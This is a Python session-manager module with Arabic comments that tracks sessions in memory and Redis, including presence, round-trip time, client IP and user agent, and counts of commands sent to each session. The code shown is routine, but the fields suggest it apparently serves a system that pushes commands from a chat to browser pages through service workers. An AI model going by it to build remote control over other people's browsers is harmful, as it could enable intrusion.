# lsh/session_mgr.py
# ============================================================
# إدارة الجلسات — مع Presence Tracking
# ============================================================

import json
import time
import threading
from .config import (
    sessions, sessions_lock, redis_client, LSH_CONFIG,
    ws_connections, ws_lock, sse_connections, sse_lock,
)


# ============================================================
# إنشاء / تحديث جلسة
# ============================================================
def create_session(session_id, chat_id):
    """★ إنشاء أو تحديث جلسة"""
    with sessions_lock:
        existing = sessions.get(session_id)

        if existing:
            existing["last_seen"] = time.time()
            existing["last_activity"] = time.time()
            existing["reconnect_count"] = existing.get("reconnect_count", 0) + 1
            session = existing
        else:
            now = time.time()
            session = {
                "session_id": session_id,
                "chat_id": chat_id,
                "created_at": now,
                "last_seen": now,
                "last_activity": now,
                "info": {},
                "live": True,
                "commands_sent": 0,
                "commands_done": 0,
                "commands_failed": 0,
                "reconnect_count": 0,
                "sw_status": "unknown",
                "page_status": "unknown",
                "stability": "initializing",
                "channel": "unknown",
                "presence": "unknown",
                "ip": None,
                "user_agent": None,
                "ws_connected": False,
                "sse_connected": False,
                "last_ping": now,
                "last_pong": now,
                "rtt_ms": 0,
            }
            sessions[session_id] = session

    # ★ حفظ في Redis
    if redis_client:
        try:
            pipe = redis_client.pipeline()
            pipe.setex(
                f"lsh_session:{session_id}",
                LSH_CONFIG["session_timeout"],
                str(chat_id)
            )
            pipe.setex(
                f"lsh_session_meta:{session_id}",
                LSH_CONFIG["session_timeout"],
                json.dumps({
                    "chat_id": chat_id,
                    "created_at": session.get("created_at", time.time()),
                    "reconnect_count": session.get("reconnect_count", 0),
                })
            )
            pipe.execute()
        except Exception as e:
            print(f"[-] Redis session save: {e}")

    return session


# ============================================================
# جلب جلسة
# ============================================================
def get_session(session_id):
    """★ جلب جلسة (مع تحديث last_seen)"""
    with sessions_lock:
        session = sessions.get(session_id)
        if session:
            session["last_seen"] = time.time()
        return session


# ============================================================
# تحديث جلسة
# ============================================================
def update_session(session_id, **kwargs):
    """تحديث بيانات جلسة"""
    with sessions_lock:
        session = sessions.get(session_id)
        if session:
            session.update(kwargs)
            session["last_seen"] = time.time()
            session["last_activity"] = time.time()
            return session
    return None


# ============================================================
# تحديث Presence
# ============================================================
def update_presence(session_id, channel, rtt_ms=None):
    """تحديث وجود الجلسة على قناة"""
    with sessions_lock:
        session = sessions.get(session_id)
        if not session:
            return

        now = time.time()
        session["channel"] = channel
        session["presence"] = "online"
        session["last_pong"] = now
        session["last_seen"] = now

        if rtt_ms is not None:
            session["rtt_ms"] = rtt_ms

        if channel == "ws":
            session["ws_connected"] = True
        elif channel == "sse":
            session["sse_connected"] = True


# ============================================================
# حذف جلسة
# ============================================================
def delete_session(session_id):
    """حذف جلسة كاملة"""
    with sessions_lock:
        sessions.pop(session_id, None)

    # ★ حذف WebSocket
    with ws_lock:
        ws_connections.pop(session_id, None)

    # ★ حذف SSE
    with sse_lock:
        sse_connections.pop(session_id, None)

    if redis_client:
        try:
            pipe = redis_client.pipeline()
            pipe.delete(f"lsh_session:{session_id}")
            pipe.delete(f"lsh_session_meta:{session_id}")
            pipe.delete(f"lsh_cmd:{session_id}")
            pipe.delete(f"lsh_active:{session_id}")
            pipe.delete(f"lsh_stream:{session_id}")
            pipe.delete(f"lsh_dead_letters:{session_id}")
            pipe.execute()
        except Exception:
            pass


# ============================================================
# قوائم
# ============================================================
def get_all_sessions():
    """جلب كل الجلسات"""
    with sessions_lock:
        return list(sessions.values())


def list_live_sessions():
    """الجلسات النشطة فقط (آخر دقيقة)"""
    now = time.time()
    with sessions_lock:
        return [
            s for s in sessions.values()
            if now - s.get("last_seen", 0) < 60
        ]


def session_exists(session_id):
    """هل موجودة؟"""
    with sessions_lock:
        return session_id in sessions


# ============================================================
# تجديد TTL
# ============================================================
def refresh_session_ttl(session_id):
    """تجديد صلاحية الجلسة في Redis"""
    if not redis_client:
        return False
    try:
        pipe = redis_client.pipeline()
        pipe.expire(
            f"lsh_session:{session_id}",
            LSH_CONFIG["session_timeout"]
        )
        pipe.expire(
            f"lsh_session_meta:{session_id}",
            LSH_CONFIG["session_timeout"]
        )
        pipe.expire(
            f"lsh_active:{session_id}",
            LSH_CONFIG["active_ttl"]
        )
        pipe.execute()
        return True
    except Exception as e:
        print(f"[-] refresh_session_ttl: {e}")
        return False


# ============================================================
# إحصائيات جلسة
# ============================================================
def get_session_stats(session_id):
    """إحصائيات كاملة لجلسة"""
    with sessions_lock:
        session = sessions.get(session_id)
        if not session:
            return None

        now = time.time()
        return {
            "session_id": session_id,
            "chat_id": session.get("chat_id"),
            "uptime": now - session.get("created_at", now),
            "idle_time": now - session.get("last_activity", now),
            "reconnect_count": session.get("reconnect_count", 0),
            "commands_sent": session.get("commands_sent", 0),
            "commands_done": session.get("commands_done", 0),
            "commands_failed": session.get("commands_failed", 0),
            "sw_status": session.get("sw_status", "unknown"),
            "page_status": session.get("page_status", "unknown"),
            "stability": session.get("stability", "unknown"),
            "channel": session.get("channel", "unknown"),
            "presence": session.get("presence", "unknown"),
            "rtt_ms": session.get("rtt_ms", 0),
            "ip": session.get("ip"),
            "ws_connected": session.get("ws_connected", False),
            "sse_connected": session.get("sse_connected", False),
          }
